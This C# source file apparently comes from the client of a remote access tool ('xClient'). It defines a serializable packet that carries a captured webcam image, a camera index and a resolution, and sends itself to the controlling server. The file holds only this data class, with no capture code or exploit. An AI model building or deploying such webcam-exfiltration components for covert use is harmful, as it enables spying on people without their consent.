using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetWebcamResponse : IPacket
{
	public byte[] Image { get; set; }

	public int Webcam { get; set; }

	public int Resolution { get; set; }

	public GetWebcamResponse()
	{
	}

	public GetWebcamResponse(byte[] image, int webcam, int resolution)
	{
		Image = image;
		Webcam = webcam;
		Resolution = resolution;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
